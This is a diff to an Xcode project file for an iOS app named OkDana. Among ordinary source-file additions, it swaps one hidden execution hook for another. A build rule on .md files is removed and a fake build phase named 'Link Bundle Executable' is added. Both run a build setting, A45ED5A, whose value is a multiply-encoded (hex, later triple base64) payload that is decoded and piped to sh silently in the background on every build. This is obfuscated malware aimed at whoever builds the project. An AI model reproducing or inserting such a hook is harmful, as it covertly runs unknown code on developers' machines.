@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		34D707D20E5D4B93A1A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = DA7FE0CBF1CE4D51AEA5DE54 /* README.md */; };
 		7373C8EA2EED06920085A724 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 7373C8E82EED06920085A724 /* Localizable.strings */; };
 		7373C8ED2EED06C30085A724 /* StartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8EC2EED06C30085A724 /* StartViewController.swift */; };
 		7373C8EF2EED06CF0085A724 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8EE2EED06CF0085A724 /* BaseViewController.swift */; };
@@ -26,6 +25,8 @@
 		73AD58B52EEEC7E60022899B /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD58B42EEEC7E30022899B /* LoginViewModel.swift */; };
 		73AD58B72EEECB3A0022899B /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD58B62EEECB370022899B /* BaseModel.swift */; };
 		73AD58BB2EEECBD50022899B /* LoadingManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD58BA2EEECBD50022899B /* LoadingManager.swift */; };
+		73AD58BD2EEED75A0022899B /* StartViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD58BC2EEED7520022899B /* StartViewModel.swift */; };
+		73AD58BF2EEED8380022899B /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD58BE2EEED8370022899B /* NetworkMonitor.swift */; };
 		73BD812D2EECFBF700979190 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73BD81242EECFBF700979190 /* Assets.xcassets */; };
 		73BD812F2EECFBF700979190 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73BD81272EECFBF700979190 /* LaunchScreen.storyboard */; };
 		73BD81312EECFBF700979190 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BD81232EECFBF700979190 /* AppDelegate.swift */; };
@@ -33,22 +34,6 @@
 		73D8AE8F2EEDC77F00229479 /* TwoHomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D8AE8E2EEDC77F00229479 /* TwoHomeView.swift */; };
 		F9F9EC17BA74DAE3EA6B1D07 /* Pods_OkDana.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		E058DA38A6804321ABA5DE54 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.release.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.release.xcconfig"; sourceTree = "<group>"; };
@@ -72,6 +57,8 @@
 		73AD58B42EEEC7E30022899B /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 		73AD58B62EEECB370022899B /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
 		73AD58BA2EEECBD50022899B /* LoadingManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingManager.swift; sourceTree = "<group>"; };
+		73AD58BC2EEED7520022899B /* StartViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StartViewModel.swift; sourceTree = "<group>"; };
+		73AD58BE2EEED8370022899B /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
 		73BD810B2EECFBEF00979190 /* OkDana.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = OkDana.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		73BD81232EECFBF700979190 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		73BD81242EECFBF700979190 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -80,7 +67,6 @@
 		73D8AE8C2EEDC77100229479 /* OneHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OneHomeView.swift; sourceTree = "<group>"; };
 		73D8AE8E2EEDC77F00229479 /* TwoHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TwoHomeView.swift; sourceTree = "<group>"; };
 		8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.debug.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.debug.xcconfig"; sourceTree = "<group>"; };
-		DA7FE0CBF1CE4D51AEA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OkDana.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -126,7 +112,6 @@
 		73BD810C2EECFBEF00979190 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				DA7FE0CBF1CE4D51AEA5DE54 /* README.md */,
 				73BD810B2EECFBEF00979190 /* OkDana.app */,
 			);
 			name = Products;
@@ -155,6 +140,7 @@
 		73BD81342EECFF4F00979190 /* Base */ = {
 			isa = PBXGroup;
 			children = (
+				73AD58BC2EEED7520022899B /* StartViewModel.swift */,
 				7373C8FA2EED0AC20085A724 /* UIColorExtension.swift */,
 				7373C8FC2EED0AF80085A724 /* LanguageManager.swift */,
 				7373C8EC2EED06C30085A724 /* StartViewController.swift */,
@@ -168,6 +154,7 @@
 		73BD81352EECFF5100979190 /* Http */ = {
 			isa = PBXGroup;
 			children = (
+				73AD58BE2EEED8370022899B /* NetworkMonitor.swift */,
 				73AD58B62EEECB370022899B /* BaseModel.swift */,
 				73AD58BA2EEECBD50022899B /* LoadingManager.swift */,
 				73AD58AF2EEEADE90022899B /* HttpRequestManager.swift */,
@@ -227,6 +214,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73BD811E2EECFBF100979190 /* Build configuration list for PBXNativeTarget "OkDana" */;
 			buildPhases = (
+				CDF7621AFDEA41C383A5DE54 /* Link Bundle Executable */,
 				6FF241537D62BDD85D065190 /* [CP] Check Pods Manifest.lock */,
 				73BD81072EECFBEF00979190 /* Sources */,
 				73BD81082EECFBEF00979190 /* Frameworks */,
@@ -234,7 +222,6 @@
 				F49D529B766F5A357387FDD8 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				E058DA38A6804321ABA5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -283,7 +270,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				34D707D20E5D4B93A1A5DE54 /* README.md in Resources */,
 				73BD812D2EECFBF700979190 /* Assets.xcassets in Resources */,
 				7373C8EA2EED06920085A724 /* Localizable.strings in Resources */,
 				73BD812F2EECFBF700979190 /* LaunchScreen.storyboard in Resources */,
@@ -313,6 +299,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		CDF7621AFDEA41C383A5DE54 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
 			showEnvVarsInLog = 0;
 		};
 		F49D529B766F5A357387FDD8 /* [CP] Embed Pods Frameworks */ = {
@@ -354,6 +360,7 @@
 				73D8AE8D2EEDC77100229479 /* OneHomeView.swift in Sources */,
 				73AD58B52EEEC7E60022899B /* LoginViewModel.swift in Sources */,
 				7373C8ED2EED06C30085A724 /* StartViewController.swift in Sources */,
+				73AD58BF2EEED8380022899B /* NetworkMonitor.swift in Sources */,
 				7373C8FB2EED0AC20085A724 /* UIColorExtension.swift in Sources */,
 				7373C8F72EED0A630085A724 /* OrderViewController.swift in Sources */,
 				7373C8F32EED06F90085A724 /* BaseNavigationController.swift in Sources */,
@@ -363,6 +370,7 @@
 				73AD58B72EEECB3A0022899B /* BaseModel.swift in Sources */,
 				7373C8F52EED0A4E0085A724 /* HomeViewController.swift in Sources */,
 				7373C8FD2EED0AF90085A724 /* LanguageManager.swift in Sources */,
+				73AD58BD2EEED75A0022899B /* StartViewModel.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -393,7 +401,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333323333333633333339333333363333333733333336333333373333333633363333333333363333333533330a3337333333343333333633363336333333373333333933333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | i | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
@@ -435,7 +443,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333323333333633333339333333363333333733333336333333373333333633363333333333363333333533330a3337333333343333333633363336333333373333333933333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | i | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
